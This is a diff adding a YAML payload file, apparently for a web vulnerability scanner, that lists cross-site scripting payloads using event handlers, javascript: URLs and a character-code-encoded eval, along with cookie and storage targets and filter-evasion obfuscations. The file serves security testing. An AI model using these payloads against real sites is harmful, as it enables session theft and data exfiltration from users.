@@ -1,0 +1,26 @@
+name: "Advanced XSS"
+vulnerability_type: "xss"
+description: "Advanced XSS payloads including DOM-based and filter evasion techniques"
+base_payloads:
+  - "<svg/onload=alert('XSS')>"
+  - "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"
+  - "<iframe src=javascript:alert('XSS')></iframe>"
+  - "<body onload=alert('XSS')>"
+  - "<script>setTimeout(function(){alert('XSS')},1000)</script>"
+  - "<input onfocus=alert('XSS') autofocus>"
+  - "<select onfocus=alert('XSS') autofocus><option>test</option></select>"
+  - "<textarea onfocus=alert('XSS') autofocus>test</textarea>"
+  - "<keygen onfocus=alert('XSS') autofocus>"
+  - "<video><source onerror=alert('XSS')>"
+variations:
+  - "document.cookie"
+  - "window.location"
+  - "localStorage"
+  - "sessionStorage"
+encodings:
+  - "url"
+  - "html"
+  - "unicode"
+obfuscations:
+  - "case_variation"
+  - "whitespace_insertion"
